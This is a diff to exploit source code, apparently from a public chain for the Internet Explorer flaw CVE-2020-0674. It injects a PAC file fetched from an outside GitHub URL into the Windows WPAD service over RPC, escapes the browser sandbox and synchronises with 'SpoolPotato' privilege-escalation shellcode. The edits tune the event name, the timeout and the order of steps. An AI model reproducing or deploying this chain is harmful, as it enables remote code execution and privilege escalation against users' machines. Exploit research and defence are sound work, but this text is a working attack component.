@@ -121,7 +121,7 @@ for this technique.
 #define SHELLCODE_BUILD
 #define SPOOL_SYNC
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
-#define SYNC_EVENT_NAME L"Global\\DoubleStarEvent"
+#define SYNC_EVENT_NAME L"Global\\DoubleStar"
 
 ////////
 ////////
@@ -337,10 +337,8 @@ void WpadSpoolSync(const wchar_t* PacUrl) {
     3. Once the event has been triggered the WPAD client ends its loop and terminates.
 
     Meanwhile the SpoolPotato shellcode:
-    1. Makes its privilege escalation operations.
-    2. Waits for the sync event to be created by the WPAD client.
-    3. Signals the event object to signal completion to the WPAD client.
-    4. Terminates itself.
+    1. Signals the event object to signal completion to the WPAD client.
+    2. Makes its privilege escalation operations.
     */
 
     if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) { // Creating event globally bypasses FF sandbox but will not work with IE11 64-bit (Protected Mode) running as Low Integrity. Event will be created to \BaseNamedObjects rather than current session namespace.
@@ -352,7 +350,7 @@ void WpadSpoolSync(const wchar_t* PacUrl) {
                 RPC_STATUS RpcStatus = WpadInjectPac(PacUrl);
                 DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x. Waiting on event signal...", RpcStatus);
 
-                if (WaitForSingleObject(hEvent, 2500) == WAIT_OBJECT_0) {
+                if (WaitForSingleObject(hEvent, 500) == WAIT_OBJECT_0) {
                     DebugLog(L"... received sync signal from code within WPAD");
                     break;
                 }
